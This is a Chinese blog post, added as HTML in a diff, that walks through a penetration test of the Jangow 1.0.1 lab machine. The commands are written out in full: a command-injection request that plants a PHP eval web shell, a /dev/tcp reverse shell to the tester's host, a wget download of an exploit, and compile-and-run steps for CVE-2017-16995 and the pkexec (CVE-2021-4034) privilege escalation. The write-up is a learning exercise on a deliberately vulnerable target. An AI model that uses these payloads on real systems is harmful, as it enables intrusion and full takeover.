@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>对jangow-1.0.1的渗透测试 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="对jangow-1.0.1的渗透测试">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2026/01/23/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="ab前置：切换靶机网卡，否则kali扫不到启动靶机时点shift停在这个界面点e进入编辑页面，把ro改成rwsignieinit&amp;#x3D;&amp;#x2F;bin&amp;#x2F;bashCtrl+x保存，ipa查看网卡信息vim&amp;#x2F;etc&amp;#x2F;network&amp;#x2F;interfaces把enp0s1">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">对jangow-1.0.1的渗透测试</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-01-23T07:00:00.000Z">2026-01-23</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>, <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/">靶机日记</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-01-23T11:05:24.661Z">2026-01-23</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="ab前置：切换靶机网卡，否则kali扫不到"><a href="#ab前置：切换靶机网卡，否则kali扫不到" class="headerlink" title="ab前置：切换靶机网卡，否则kali扫不到"></a>ab前置：切换靶机网卡，否则kali扫不到</h1><p>启动靶机时点shift停在这个界面</p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4ffa3fe32ba9b5a7f9d9eaa4b0d03694.png"></p>
+<p>点e进入编辑页面，把ro改成rw signie init&#x3D;&#x2F;bin&#x2F;bash</p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0de242ad27420eaef6c9746bd4b6c1b6.png"></p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5a3e4a19ccb6836dbbdea4e411859405.png"></p>
+<p>Ctrl+x保存，ip a查看网卡信息</p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12ce15660e7ca91ff574b4134db5e815.png"></p>
+<p>vim &#x2F;etc&#x2F;network&#x2F;interfaces</p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ac173df15b2ca7cb1f4eab544f605e51.png"></p>
+<p>把enp0s17改为ens33，保存退出</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1.1主机发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.59.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image.png"></p>
+<p>存活靶机地址为<strong>192.168.59.139</strong></p>
+<p>1.2端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.59.139</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(1).png">80端口存在web服务</p>
+<p>1.3目录扫描</p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(2).png"></p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(3).png"></p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(4).png">发现传参口并且能执行命令，尝试写入木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.139/site/busque.php?buscar=echo &#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>成功连接蚁剑</p>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>利用蚁剑传入反弹shell文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.59.128/443 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br><span class="line">访问执行</span><br><span class="line">在kali开启端口监听</span><br><span class="line">nc -lvnp 443</span><br><span class="line"></span><br><span class="line">注：这里只能使用443端口进行反弹shell，因为靶机的防火墙出站规则过滤了危险端口，</span><br><span class="line">而像443(https)和80(http)通常会开放</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(5).png"></p>
+<h1 id="提权（这里有多种方法）"><a href="#提权（这里有多种方法）" class="headerlink" title="提权（这里有多种方法）"></a>提权（这里有多种方法）</h1><h2 id="方法一（内核提权漏洞）"><a href="#方法一（内核提权漏洞）" class="headerlink" title="方法一（内核提权漏洞）"></a>方法一（内核提权漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">#查看内核版本，是否存在内核提权漏洞</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(6).png"></p>
+<p>查询资料得知该版本存在内核提取漏洞：</p>
+<p>CVE-2017-16995 (Ubuntu 16.04 BPF 提权)</p>
+<p>操作步骤：</p>
+<ul>
+<li>在 Kali 上搜索该漏洞：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 45010</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(7).png"></p>
+<ul>
+<li>你会找到一个名为 45010.c 的文件。</li>
+<li>传输文件： 在 Kali 上启动一个 Python HTTP 服务，在靶机上用 wget 下载它。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 443</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>(靶机只允许443端口出站，试了80端口不行，必须先停止反弹shell)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.139/site/busque.php?buscar=wget http://192.168.59.128:443/exploit.c -P /tmp</span><br></pre></td></tr></table></figure>
+
+<p>然后恢复靶机shell</p>
+<p>编译运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">gcc 45010.c -o exploit</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>运行后，直接就是 root 了。</li>
+<li><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(8).png"></li>
+</ul>
+<h2 id="方法二（SUID提权）"><a href="#方法二（SUID提权）" class="headerlink" title="方法二（SUID提权）"></a>方法二（SUID提权）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#寻找具有root权限的文件</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(9).png"></p>
+<p>查找资料发现pkexec有一个漏洞</p>
+<p>CVE-2021-4034</p>
+<p>前往github寻找利用脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pyhrr0/pwnkit/blob/main/pwnkit.c">pwnkit&#x2F;pwnkit.c at main · pyhrr0&#x2F;pwnkit</a></p>
+<p>下载下来通过蚁剑上传</p>
+<p>根据README来编译使用<img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(10).png"></p>
+<p>运行后拿到root权限</p>
+<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(11).png"></p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>对jangow-1.0.1的渗透测试</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-01-23</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/01/22/%E5%AF%B9Red%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对Red的渗透测试</a>
+      </div>
+    
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ab%E5%89%8D%E7%BD%AE%EF%BC%9A%E5%88%87%E6%8D%A2%E9%9D%B6%E6%9C%BA%E7%BD%91%E5%8D%A1%EF%BC%8C%E5%90%A6%E5%88%99kali%E6%89%AB%E4%B8%8D%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">ab前置：切换靶机网卡，否则kali扫不到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">渗透过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%EF%BC%88%E8%BF%99%E9%87%8C%E6%9C%89%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">提权（这里有多种方法）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%88%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">方法一（内核提权漏洞）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%88SUID%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">方法二（SUID提权）</span></a></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
+            
+                <a href="/tags/Easy/" class="tag" aria-label="标签: #Easy">#Easy</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
+                        内网渗透
+                        <span>(4)</span>
+                    </a>
+                </div>
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
+                        靶机日记
+                        <span>(4)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
